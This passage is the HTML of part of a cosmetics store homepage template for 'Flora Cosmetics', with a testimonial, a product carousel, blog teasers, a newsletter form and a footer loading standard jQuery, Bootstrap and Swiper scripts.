              <blockquote class="display-5 heading-font text-capitalize text-primary">"This is my go-to site for all my beauty needs. The product recommendations are spot on, and I've seen a noticeable improvement in my skin texture and tone. Excellent customer service and fast shipping too!"</blockquote>
              <div class="author-detail">
                <div class="name text-gray-dark text-capitalize pt-3 fs-3">Jenny Brown</div>
              </div>
            </div>
          </div>
        </div>
        <div class="swiper-arrow-wrap position-absolute d-flex align-items-center justify-content-center mt-5">
          <div class="swiper-arrow swiper-arrow-prev border-end">
            <svg class="arrow-left-light svg-secondary" width="150" height="95">
              <use xlink:href="#arrow-left-light" />
            </svg>
          </div>
          <div class="swiper-arrow swiper-arrow-next">
            <svg class="arrow-right-light svg-secondary" width="150" height="95">
              <use xlink:href="#arrow-right-light" />
            </svg>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section id="latest-drops" class="product-carousel overflow-hidden p-5 bg-overlay position-relative">
    <div class="container-lg">
      <div class="section-header text-center mb-5">
        <h2 class="display-2">Latest Drops</h2>
      </div>
      <div class="swiper product-swiper mb-5">
        <div class="swiper-wrapper">
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item5.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Ordinary
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$95.00</span>
              </div>
            </div>
          </div>
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item6.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Misolo
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$86.00</span>
              </div>
            </div>
          </div>
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item3.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Everdrop
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$82.00</span>
              </div>
            </div>
          </div>
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item5.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Ordinary
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$95.00</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="swiper-pagination position-absolute"></div>
    </div>
  </section>
  <section id="latest-blog" class="my-lg-8">
    <div class="container-lg">
      <div class="section-header text-center mb-5">
        <h2 class="display-2">Recent Blogs</h2>
      </div>
      <div class="row">
        <div class="col-lg-4 col-md-6">
          <article class="card-item mb-5">
            <div class="card-image text-center">
              <!-- <a href="single-post.html"> -->
                <img src="images/post-image1.jpg" alt="post-image" class="img-fluid rounded-5">
              <!-- </a> -->
            </div>
            <div class="card-body text-center my-3">
              <h3 class="display-6 text-capitalize m-0">
                <!-- <a href="single-post.html" class="text-primary"> -->
                    Skincare brands for women
                <!-- </a> -->
              </h3>
              <p>Explore our top skincare brands, crafted to meet your unique skin needs and enhance your beauty.

                .</p>
            </div>
          </article>
        </div>
        <div class="col-lg-4 col-md-6">
          <article class="card-item mb-5">
            <div class="card-image text-center">
              <!-- <a href="single-post.html"> -->
                <img src="images/post-image2.jpg" alt="post-image" class="img-fluid rounded-5">
              <!-- </a> -->
            </div>
            <div class="card-body text-center my-3">
              <h3 class="display-6 text-capitalize m-0">
                <!-- <a href="single-post.html" class="text-primary"> -->
                    Easy skincare formula
                <!-- </a> -->
              </h3>
              <p>Simplify your routine with our easy-to-use skincare formulas designed for radiant, healthy skin.

              </p>
            </div>
          </article>
        </div>
        <div class="col-lg-4 col-md-6">
          <article class="card-item mb-5">
            <div class="card-image text-center">
              <!-- <a href="single-post.html"> -->
                <img src="images/post-image3.jpg" alt="post-image" class="img-fluid rounded-5">
              <!-- </a> -->
            </div>
            <div class="card-body text-center my-3">
              <h3 class="display-6 text-capitalize m-0">
                <!-- <a href="single-post.html" class="text-primary"> -->
                    Simple habits for good skin
                <!-- </a> -->
              </h3>
              <p>Adopt these easy habits to maintain clear, glowing skin every day.

              </p>
            </div>
          </article>
        </div>
      </div>
      <div class="text-center">
        <a href="contact.php" class="btn btn-lg btn-outline-gray text-uppercase mt-3 rounded-5">Contact Us</a>
      </div>
    </div>
  </section>
  <section id="subscribe" class="py-lg-6">
    <div class="container">
      <div class="row d-flex justify-content-center">
        <div class="col-lg-9">
          <div class="subscribe-content">
            <div class="subscribe-header text-center">
              <h2 class="display-2 text-capitalize">Subscribe to get updates</h2>
            </div>
            <form id="form" class="py-5 position-relative">
              <input type="text" name="email" placeholder="Write your email address here..."
                class="w-100 bg-transparent border-0 border-bottom pb-3 fst-italic">
              <svg class="send position-absolute svg-primary" width="54" height="54">
                <use xlink:href="#send"></use>
              </svg>
            </form>
          </div>
        </div>
      </div>
    </div>
  </section>
  <!-- <section id="instagram-wrap" class="bg-overlay py-lg-7">
    <div class="container-lg">
      <div class="section-header text-center mb-5">
        <h2 class="section-title">Shop Our Insta</h2>
      </div>
      <div class="row">
        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
          <div class="image-holder position-relative">
            <a href="https://www.instagram.com/templatesjungle/" target="_blank">
              <img src="images/insta-item1.jpg" alt="instagram" class="img-fluid rounded-3">
              <div class="insta-item overlay-item position-absolute d-flex align-items-center justify-content-center">
                <svg class="instagram svg-white" width="45" height="45">
                  <use xlink:href="#instagram"></use>
                </svg>
              </div>
            </a>
          </div>
        </div>
        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
          <div class="image-holder position-relative">
            <a href="https://www.instagram.com/templatesjungle/" target="_blank">
              <img src="images/insta-item2.jpg" alt="instagram" class="img-fluid rounded-3">
              <div class="insta-item overlay-item position-absolute d-flex align-items-center justify-content-center">
                <svg class="instagram svg-white" width="45" height="45">
                  <use xlink:href="#instagram"></use>
                </svg>
              </div>
            </a>
          </div>
        </div>
        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
          <div class="image-holder position-relative">
            <a href="https://www.instagram.com/templatesjungle/" target="_blank">
              <img src="images/insta-item3.jpg" alt="instagram" class="img-fluid rounded-3">
              <div class="insta-item overlay-item position-absolute d-flex align-items-center justify-content-center">
                <svg class="instagram svg-white" width="45" height="45">
                  <use xlink:href="#instagram"></use>
                </svg>
              </div>
            </a>
          </div>
        </div>
        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
          <div class="image-holder position-relative">
            <a href="https://www.instagram.com/templatesjungle/" target="_blank">
              <img src="images/insta-item4.jpg" alt="instagram" class="img-fluid rounded-3">
              <div class="insta-item overlay-item position-absolute d-flex align-items-center justify-content-center">
                <svg class="instagram svg-white" width="45" height="45">
                  <use xlink:href="#instagram"></use>
                </svg>
              </div>
            </a>
          </div>
        </div>
        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
          <div class="image-holder position-relative">
            <a href="https://www.instagram.com/templatesjungle/" target="_blank">
              <img src="images/insta-item5.jpg" alt="instagram" class="img-fluid rounded-3">
              <div class="insta-item overlay-item position-absolute d-flex align-items-center justify-content-center">
                <svg class="instagram svg-white" width="45" height="45">
                  <use xlink:href="#instagram"></use>
                </svg>
              </div>
            </a>
          </div>
        </div>
        <div class="col-lg-2 col-md-4 col-sm-6 mb-3">
          <div class="image-holder position-relative">
            <a href="https://www.instagram.com/templatesjungle/" target="_blank">
              <img src="images/insta-item6.jpg" alt="instagram" class="img-fluid rounded-3">
              <div class="insta-item overlay-item position-absolute d-flex align-items-center justify-content-center">
                <svg class="instagram svg-white" width="45" height="45">
                  <use xlink:href="#instagram"></use>
                </svg>
              </div>
            </a>
          </div>
        </div>
      </div>
    </div>
  </section> -->
  <footer id="footer" class="overflow-hidden my-lg-7">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-lg-4 col-md-6">
          <div class="image-holder text-center mb-5">
            <img src="images/main-logo.png" style="height:100px;" alt="logo">
          </div>
          <ul class="menu-list list-unstyled d-flex justify-content-between">
            <li class="pb-2">
              <a href="#">Home</a>
            </li>
            <li class="pb-2">
              <a href="about.php">About</a>
            </li>
            <!-- <li class="pb-2">
              <a href="#">Shop</a>
            </li>
            <li class="pb-2">
              <a href="#">Blog</a>
            </li> -->
            <li class="pb-2">
              <a href="contact.php">Contact</a>
            </li>
          </ul>
          <!-- <ul class="social-links list-unstyled d-flex justify-content-between">
            <li class="border rounded-3">
              <a href="#" class="d-flex p-3 svg-primary">
                <svg class="facebook" width="25" height="25">
                  <use xlink:href="#facebook"></use>
                </svg>
              </a>
            </li>
            <li class="border rounded-3">
              <a href="#" class="d-flex p-3 svg-primary">
                <svg class="twitter" width="25" height="25">
                  <use xlink:href="#twitter"></use>
                </svg>
              </a>
            </li>
            <li class="border rounded-3">
              <a href="#" class="d-flex p-3 svg-primary">
                <svg class="instagram" width="25" height="25">
                  <use xlink:href="#instagram"></use>
                </svg>
              </a>
            </li>
            <li class="border rounded-3">
              <a href="#" class="d-flex p-3 svg-primary">
                <svg class="linkedin" width="25" height="25">
                  <use xlink:href="#linkedin"></use>
                </svg>
              </a>
            </li>
            <li class="border rounded-3">
              <a href="#" class="d-flex p-3 svg-primary">
                <svg class="youtube" width="25" height="25">
                  <use xlink:href="#youtube"></use>
                </svg>
              </a>
            </li>
          </ul> -->
        </div>
      </div>
    </div>
  </footer>
  <div class="footer-bottom text-center border-top pt-3">
    <p>© 2024 Copyright <a href="#" class="fw-bold"> Flora Cosmetics</a>. All rights reserved
    </p>
  </div>
  <script src="js/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
    crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js"></script>
  <script src="js/plugins.js"></script>
  <script src="js/script.js"></script>
</body>

</html>
